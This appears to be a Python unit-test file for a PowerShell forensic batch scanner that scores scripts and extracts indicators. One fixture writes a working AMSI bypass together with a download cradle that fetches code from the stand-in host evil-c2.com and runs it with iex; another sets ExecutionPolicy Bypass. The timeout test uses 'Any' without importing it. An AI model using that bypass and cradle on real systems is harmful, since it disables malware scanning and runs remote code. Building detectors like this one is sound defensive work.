"""
Unit and Integration Tests for PowerShell AST Batch Forensic Scanner & Mass Parallel Analyzer.
Covers batch models, directory discovery, multi-encoding safe reading, parallel execution,
timeout handling, error isolation, risk scoring, deobfuscated file export, report formats, and CLI flags.
"""

import json
import os
import shutil
import tempfile
import unittest
from unittest.mock import MagicMock, patch

from src.batch_models import (
    BatchScanOptions,
    BatchSummary,
    FileScanResult,
    RiskTier,
    ScanStatus,
)
from src.batch_scanner import PowerShellBatchScanner
from src.batch_runner import PowerShellBatchRunner
from src.batch import scan_directory, scan_files, run_batch_cli
from src.cli_args import build_cli_parser


class TestBatchModels(unittest.TestCase):
    """Verifies schema definitions, enums, risk rankings, and multi-format serialization."""

    def test_scan_status_enum(self) -> None:
        self.assertEqual(ScanStatus.SUCCESS.value, "success")
        self.assertEqual(ScanStatus.SKIPPED.value, "skipped")
        self.assertEqual(ScanStatus.TIMEOUT.value, "timeout")
        self.assertEqual(ScanStatus.FAILED.value, "failed")

    def test_risk_tier_rank_and_comparison(self) -> None:
        self.assertEqual(RiskTier.CLEAN.rank, 0)
        self.assertEqual(RiskTier.SUSPICIOUS.rank, 1)
        self.assertEqual(RiskTier.MALICIOUS.rank, 2)

        self.assertTrue(RiskTier.MALICIOUS.is_at_least(RiskTier.SUSPICIOUS))
        self.assertTrue(RiskTier.SUSPICIOUS.is_at_least(RiskTier.CLEAN))
        self.assertFalse(RiskTier.CLEAN.is_at_least(RiskTier.SUSPICIOUS))

        self.assertEqual(RiskTier.from_str("MALICIOUS"), RiskTier.MALICIOUS)
        self.assertEqual(RiskTier.from_str("suspicious"), RiskTier.SUSPICIOUS)
        self.assertEqual(RiskTier.from_str("Clean"), RiskTier.CLEAN)
        self.assertEqual(RiskTier.from_str("unknown_val"), RiskTier.CLEAN)
        self.assertEqual(RiskTier.from_str(None), RiskTier.CLEAN)

    def test_file_scan_result_serialization(self) -> None:
        result = FileScanResult(
            file_path="/tmp/test.ps1",
            relative_path="test.ps1",
            file_size=1024,
            sha256="abc123def456",
            status=ScanStatus.SUCCESS,
            risk_tier=RiskTier.MALICIOUS,
            risk_score=85.5,
            risk_reasons=["AMSI/ETW Defense Evasion: AmsiScanBuffer", "Remote payload download cradle: http://c2.com"],
            duration_ms=45.2,
            encoding_used="utf-8",
            original_entropy=6.1234,
            deobfuscated_entropy=4.5678,
            entropy_reduction=1.5556,
            original_length=200,
            deobfuscated_length=150,
            size_reduction_pct=25.0,
            carved_urls=["http://c2.com/stage.ps1"],
            amsi_etw_count=1,
            policy_bypass_count=0,
            encoded_command_layers=1,
            decompressed_stream_layers=0,
            iex_layers=1,
            original_script="iex 'calc'",
            deobfuscated_script="Invoke-Expression 'calc'",
        )

        d = result.to_dict(include_code=False)
        self.assertEqual(d["relative_path"], "test.ps1")
        self.assertEqual(d["risk_tier"], "malicious")
        self.assertEqual(d["risk_score"], 85.5)
        self.assertNotIn("original_script", d)

        d_code = result.to_dict(include_code=True)
        self.assertIn("original_script", d_code)

        json_str = result.to_json()
        parsed = json.loads(json_str)
        self.assertEqual(parsed["status"], "success")

        md = result.to_markdown()
        self.assertIn("test.ps1", md)
        self.assertIn("MALICIOUS", md)
        self.assertIn("http://c2.com/stage.ps1", md)

        csv_row = result.to_csv()
        self.assertIn('"test.ps1","success","malicious"', csv_row)

        table_row = result.to_text_table()
        self.assertIn("test.ps1", table_row)
        self.assertIn("MALICIOUS", table_row)

    def test_batch_scan_options_serialization(self) -> None:
        opts = BatchScanOptions(
            target_dir="./samples",
            output_dir="./out",
            max_workers=8,
            file_extensions=[".ps1", ".psm1"],
            recursive=False,
            timeout_sec=15.0,
            min_risk=RiskTier.SUSPICIOUS,
        )
        d = opts.to_dict()
        self.assertEqual(d["target_dir"], "./samples")
        self.assertEqual(d["max_workers"], 8)
        self.assertEqual(d["min_risk"], "suspicious")
        self.assertFalse(d["recursive"])

        json_str = opts.to_json()
        self.assertIn('"target_dir": "./samples"', json_str)

    def test_batch_summary_metrics_and_formatting(self) -> None:
        r1 = FileScanResult(
            file_path="/a.ps1",
            relative_path="a.ps1",
            file_size=500,
            sha256="hash_a",
            status=ScanStatus.SUCCESS,
            risk_tier=RiskTier.CLEAN,
            risk_score=0.0,
            duration_ms=10.0,
        )
        r2 = FileScanResult(
            file_path="/b.ps1",
            relative_path="b.ps1",
            file_size=1500,
            sha256="hash_b",
            status=ScanStatus.SUCCESS,
            risk_tier=RiskTier.MALICIOUS,
            risk_score=90.0,
            risk_reasons=["AMSI Patch"],
            carved_urls=["https://malware.org/x.ps1"],
            amsi_etw_count=1,
            duration_ms=20.0,
        )
        r3 = FileScanResult(
            file_path="/c.ps1",
            relative_path="c.ps1",
            file_size=200,
            status=ScanStatus.TIMEOUT,
            risk_tier=RiskTier.SUSPICIOUS,
            risk_score=30.0,
            duration_ms=30.0,
        )

        summary = BatchSummary(
            target_dir="/test_dir",
            total_files_discovered=3,
            total_files_scanned=3,
            successful_scans=2,
            timed_out_scans=1,
            clean_count=1,
            suspicious_count=1,
            malicious_count=1,
            total_duration_ms=60.0,
            total_bytes_scanned=2200,
            total_urls_carved=1,
            unique_urls=["https://malware.org/x.ps1"],
            total_amsi_bypasses=1,
            results=[r1, r2, r3],
        )

        self.assertEqual(summary.pass_rate, 66.67)
        self.assertEqual(summary.malicious_rate, 33.33)
        self.assertEqual(summary.suspicious_rate, 33.33)
        self.assertEqual(summary.average_duration_ms, 20.0)

        # JSON
        j = summary.to_json()
        parsed = json.loads(j)
        self.assertEqual(parsed["total_files_scanned"], 3)
        self.assertEqual(len(parsed["results"]), 3)

        # Markdown
        md = summary.to_markdown()
        self.assertIn("# Batch Forensic Scan Report", md)
        self.assertIn("https://malware.org/x.ps1", md)

        # CSV
        csv_data = summary.to_csv()
        self.assertIn('"RelativePath","Status","RiskTier"', csv_data)
        self.assertIn('"b.ps1","success","malicious"', csv_data)

        # ASCII Table
        table = summary.to_text_table()
        self.assertIn("PowerShell AST Batch Forensic Scanner Summary Report", table)
        self.assertIn("b.ps1", table)

        # IoC Export
        iocs = summary.export_iocs()
        self.assertEqual(iocs["total_iocs"], 2)  # 1 url + 1 malicious hash
        self.assertIn("https://malware.org/x.ps1", iocs["carved_urls"])
        self.assertIn("hash_b", iocs["malicious_file_hashes_sha256"])


class TestBatchScanner(unittest.TestCase):
    """Verifies safe directory traversal, file size limits, and multi-encoding decoding."""

    def setUp(self) -> None:
        self.temp_dir = tempfile.mkdtemp(prefix="pwsh_batch_test_")
        self.scanner = PowerShellBatchScanner()

    def tearDown(self) -> None:
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_discover_files_recursive_and_filtering(self) -> None:
        # Create directory hierarchy
        sub_dir = os.path.join(self.temp_dir, "sub", "deep")
        os.makedirs(sub_dir, exist_ok=True)

        f1 = os.path.join(self.temp_dir, "script1.ps1")
        f2 = os.path.join(self.temp_dir, "module.psm1")
        f3 = os.path.join(self.temp_dir, "ignore.txt")
        f4 = os.path.join(sub_dir, "nested.ps1")
        f5 = os.path.join(sub_dir, "large.ps1")

        with open(f1, "w", encoding="utf-8") as f:
            f.write("Write-Host '1'")
        with open(f2, "w", encoding="utf-8") as f:
            f.write("Write-Host '2'")
        with open(f3, "w", encoding="utf-8") as f:
            f.write("Not a powershell script")
        with open(f4, "w", encoding="utf-8") as f:
            f.write("Write-Host 'nested'")
        with open(f5, "w", encoding="utf-8") as f:
            f.write("x" * 2000)

        # 1. Recursive discovery with .ps1 and .psm1
        opts = BatchScanOptions(
            target_dir=self.temp_dir,
            file_extensions=[".ps1", ".psm1"],
            recursive=True,
            max_file_size_bytes=1500,  # f5 should be filtered out
        )
        discovered = self.scanner.discover_files(opts)
        rel_paths = [rel for _, rel in discovered]

        self.assertIn("script1.ps1", rel_paths)
        self.assertIn("module.psm1", rel_paths)
        self.assertIn(os.path.join("sub", "deep", "nested.ps1"), rel_paths)
        self.assertNotIn("ignore.txt", rel_paths)
        self.assertNotIn(os.path.join("sub", "deep", "large.ps1"), rel_paths)

        # 2. Non-recursive discovery
        opts_non_rec = BatchScanOptions(
            target_dir=self.temp_dir,
            file_extensions=[".ps1"],
            recursive=False,
        )
        discovered_non_rec = self.scanner.discover_files(opts_non_rec)
        rel_non_rec = [rel for _, rel in discovered_non_rec]
        self.assertEqual(rel_non_rec, ["script1.ps1"])

    def test_discover_files_single_file_target(self) -> None:
        target_file = os.path.join(self.temp_dir, "single.ps1")
        with open(target_file, "w", encoding="utf-8") as f:
            f.write("$x = 1")

        opts = BatchScanOptions(target_dir=target_file)
        discovered = self.scanner.discover_files(opts)
        self.assertEqual(len(discovered), 1)
        self.assertEqual(discovered[0][1], "single.ps1")

    def test_discover_files_non_existent_raises(self) -> None:
        opts = BatchScanOptions(target_dir=os.path.join(self.temp_dir, "non_existent"))
        with self.assertRaises(FileNotFoundError):
            self.scanner.discover_files(opts)

    def test_read_file_safe_encodings(self) -> None:
        # UTF-8
        f_utf8 = os.path.join(self.temp_dir, "utf8.ps1")
        with open(f_utf8, "w", encoding="utf-8") as f:
            f.write("$val = '한글 테스트'")
        text, sha, enc, size = self.scanner.read_file_safe(f_utf8)
        self.assertEqual(text, "$val = '한글 테스트'")
        self.assertEqual(enc, "utf-8")
        self.assertTrue(len(sha) == 64)

        # UTF-8 with BOM
        f_bom = os.path.join(self.temp_dir, "bom.ps1")
        with open(f_bom, "w", encoding="utf-8-sig") as f:
            f.write("$x = 42")
        text, sha, enc, size = self.scanner.read_file_safe(f_bom)
        self.assertEqual(text, "$x = 42")
        self.assertEqual(enc, "utf-8-sig")

        # UTF-16LE with BOM
        f_utf16le = os.path.join(self.temp_dir, "utf16le.ps1")
        with open(f_utf16le, "wb") as f:
            f.write(b"\xff\xfe" + "$y = 'windows'".encode("utf-16-le"))
        text, sha, enc, size = self.scanner.read_file_safe(f_utf16le)
        self.assertEqual(text, "$y = 'windows'")
        self.assertEqual(enc, "utf-16-le")

        # UTF-16BE with BOM
        f_utf16be = os.path.join(self.temp_dir, "utf16be.ps1")
        with open(f_utf16be, "wb") as f:
            f.write(b"\xfe\xff" + "$z = 'be'".encode("utf-16-be"))
        text, sha, enc, size = self.scanner.read_file_safe(f_utf16be)
        self.assertEqual(text, "$z = 'be'")
        self.assertEqual(enc, "utf-16-be")

        # CP1252 / Windows-1252 (Western European with 0x80-0xFF characters)
        f_cp1252 = os.path.join(self.temp_dir, "cp1252.ps1")
        with open(f_cp1252, "wb") as f:
            # 0x80 is Euro sign in cp1252, which is invalid as single byte in utf-8
            f.write(b"$currency = '\x80'")
        text, sha, enc, size = self.scanner.read_file_safe(f_cp1252)
        self.assertEqual(text, "$currency = '\u20ac'")
        self.assertEqual(enc, "cp1252")

    def test_read_file_safe_max_size_guard(self) -> None:
        f_large = os.path.join(self.temp_dir, "large.ps1")
        with open(f_large, "wb") as f:
            f.write(b"A" * 500)

        with self.assertRaises(ValueError):
            self.scanner.read_file_safe(f_large, max_size_bytes=100)


class TestBatchRunner(unittest.TestCase):
    """Verifies parallel execution, timeout handling, error isolation, risk scoring, and exports."""

    def setUp(self) -> None:
        self.temp_dir = tempfile.mkdtemp(prefix="pwsh_runner_test_")
        self.out_dir = os.path.join(self.temp_dir, "out")
        self.runner = PowerShellBatchRunner()

    def tearDown(self) -> None:
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_runner_clean_suspicious_malicious_scoring(self) -> None:
        # 1. Clean script
        f_clean = os.path.join(self.temp_dir, "clean.ps1")
        with open(f_clean, "w", encoding="utf-8") as f:
            f.write("Write-Host 'Benign system administration utility'")

        # 2. Suspicious script: ExecutionPolicy Bypass
        f_susp = os.path.join(self.temp_dir, "suspicious.ps1")
        with open(f_susp, "w", encoding="utf-8") as f:
            f.write("Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force")

        # 3. Malicious script: AMSI Patch + WebClient Download cradle
        f_mal = os.path.join(self.temp_dir, "malicious.ps1")
        with open(f_mal, "w", encoding="utf-8") as f:
            f.write(
                "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
                ".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n"
                "(New-Object System.Net.WebClient).DownloadString('http://evil-c2.com/payload.ps1') | iex"
            )

        opts = BatchScanOptions(
            target_dir=self.temp_dir,
            output_dir=self.out_dir,
            export_deobfuscated=True,
            export_iocs=True,
            max_workers=3,
        )

        summary = self.runner.run(opts)

        self.assertEqual(summary.total_files_scanned, 3)
        self.assertEqual(summary.clean_count, 1)
        self.assertEqual(summary.suspicious_count, 1)
        self.assertEqual(summary.malicious_count, 1)

        # Verify results details
        results_by_name = {r.relative_path: r for r in summary.results}

        clean_res = results_by_name["clean.ps1"]
        self.assertEqual(clean_res.risk_tier, RiskTier.CLEAN)
        self.assertEqual(clean_res.status, ScanStatus.SUCCESS)

        susp_res = results_by_name["suspicious.ps1"]
        self.assertEqual(susp_res.risk_tier, RiskTier.SUSPICIOUS)
        self.assertGreaterEqual(susp_res.policy_bypass_count, 1)

        mal_res = results_by_name["malicious.ps1"]
        self.assertEqual(mal_res.risk_tier, RiskTier.MALICIOUS)
        self.assertGreaterEqual(mal_res.amsi_etw_count, 1)
        self.assertIn("http://evil-c2.com/payload.ps1", mal_res.carved_urls)

        # Verify unique carved URLs in summary
        self.assertIn("http://evil-c2.com/payload.ps1", summary.unique_urls)

        # Verify deobfuscated files exported preserving directory structure
        exported_clean = os.path.join(self.out_dir, "clean.ps1")
        exported_mal = os.path.join(self.out_dir, "malicious.ps1")
        self.assertTrue(os.path.exists(exported_clean))
        self.assertTrue(os.path.exists(exported_mal))

        # Verify IoC export file
        ioc_file = os.path.join(self.out_dir, "iocs.json")
        self.assertTrue(os.path.exists(ioc_file))
        with open(ioc_file, "r", encoding="utf-8") as f:
            ioc_data = json.load(f)
        self.assertIn("http://evil-c2.com/payload.ps1", ioc_data["carved_urls"])

    def test_runner_error_isolation(self) -> None:
        # Create a valid script and an invalid/unreadable entry
        f_valid = os.path.join(self.temp_dir, "good.ps1")
        with open(f_valid, "w", encoding="utf-8") as f:
            f.write("$a = 1 + 2")

        # Mock scanner to return a non-existent file alongside good.ps1
        f_missing = os.path.join(self.temp_dir, "missing.ps1")

        summary = self.runner.run_files([f_valid, f_missing])
        self.assertEqual(summary.total_files_scanned, 1)  # only valid file processed, missing skipped gracefully
        self.assertEqual(summary.successful_scans, 1)

    def test_runner_timeout_handling(self) -> None:
        f_test = os.path.join(self.temp_dir, "timeout.ps1")
        with open(f_test, "w", encoding="utf-8") as f:
            f.write("Start-Sleep -Seconds 10")

        # Mock _scan_single_file to simulate a hang/timeout
        def slow_scan(*args: Any, **kwargs: Any) -> FileScanResult:
            import time
            time.sleep(1.0)
            return FileScanResult(file_path=f_test, relative_path="timeout.ps1")

        with patch.object(self.runner, "_scan_single_file", side_effect=slow_scan):
            opts = BatchScanOptions(
                target_dir=self.temp_dir,
                timeout_sec=0.05,  # Very short timeout
            )
            summary = self.runner.run(opts)

            self.assertEqual(summary.timed_out_scans, 1)
            self.assertEqual(summary.results[0].status, ScanStatus.TIMEOUT)


class TestBatchFacadeAndCli(unittest.TestCase):
    """Verifies high-level scan_directory, scan_files, and CLI argument execution dispatch."""

    def setUp(self) -> None:
        self.temp_dir = tempfile.mkdtemp(prefix="pwsh_facade_test_")
        self.f1 = os.path.join(self.temp_dir, "test1.ps1")
        with open(self.f1, "w", encoding="utf-8") as f:
            f.write("Write-Output 'Hello Batch Facade'")

    def tearDown(self) -> None:
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_scan_directory_and_scan_files_facade(self) -> None:
        # scan_directory
        summary_dir = scan_directory(self.temp_dir)
        self.assertEqual(summary_dir.total_files_scanned, 1)
        self.assertEqual(summary_dir.successful_scans, 1)

        # scan_files
        summary_files = scan_files([self.f1])
        self.assertEqual(summary_files.total_files_scanned, 1)
        self.assertEqual(summary_files.successful_scans, 1)

    def test_cli_parser_batch_arguments(self) -> None:
        parser = build_cli_parser()

        args = parser.parse_args(["--batch", self.temp_dir, "--batch-workers", "6", "--batch-format", "json"])
        self.assertEqual(args.batch_dir, self.temp_dir)
        self.assertEqual(args.batch_workers, 6)
        self.assertEqual(args.batch_format, "json")

        args_alias = parser.parse_args(["--scan-dir", self.temp_dir, "--no-batch-recursive"])
        self.assertEqual(args_alias.batch_dir, self.temp_dir)
        self.assertFalse(args_alias.batch_recursive)

    def test_run_batch_cli_dispatch(self) -> None:
        parser = build_cli_parser()
        report_file = os.path.join(self.temp_dir, "batch_report.md")

        out_dir = os.path.join(self.temp_dir, "cli_out")
        args = parser.parse_args([
            "--batch", self.temp_dir,
            "--batch-format", "markdown",
            "--batch-report", report_file,
            "--batch-output", out_dir,
            "--batch-export-iocs",
        ])

        exit_code = run_batch_cli(args)
        self.assertEqual(exit_code, 0)
        self.assertTrue(os.path.exists(report_file))
        self.assertTrue(os.path.exists(os.path.join(out_dir, "iocs.json")))

        with open(report_file, "r", encoding="utf-8") as f:
            content = f.read()
        self.assertIn("Batch Forensic Scan Report", content)


if __name__ == "__main__":
    unittest.main()
